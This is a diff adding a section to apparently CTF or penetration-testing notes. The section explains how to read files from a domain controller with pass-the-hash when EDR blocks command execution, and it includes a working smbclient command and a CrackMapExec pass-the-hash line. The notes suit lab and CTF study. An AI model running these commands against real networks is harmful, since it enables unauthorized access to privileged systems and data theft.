@@ -249,6 +249,15 @@ them in the app and screenshotting, not Ctrl+C. AppLocker often blocks dropped .
 with built-ins (reg/sc/wmic/schtasks) which live in the allowed C:\Windows. See also [[password-cracking]]
 (KeePass DPAPI "Windows user account" DBs must be opened on the box as the owning user).
 
+**No exec needed to win — read files directly with pass-the-hash when EDR blocks command execution.**
+If Defender/EDR kills `wmiexec`/`psexec`/`-x` exec primitives but you hold a DA (or any privileged)
+NT hash, you do not need code execution to grab a flag/file — `smbclient` authenticates with the
+hash alone and reads via SMB, no process ever spawns on the target:
+
+```bash
+smbclient //DC/C$ -U DOMAIN/Administrator --pw-nt-hash <NTHASH> -c 'get <path-to-file>'
+```
+
 CrackMapExec / NetExec PtH:
 ```bash
 crackmapexec smb TARGET_IP -u user -H NTLM_HASH
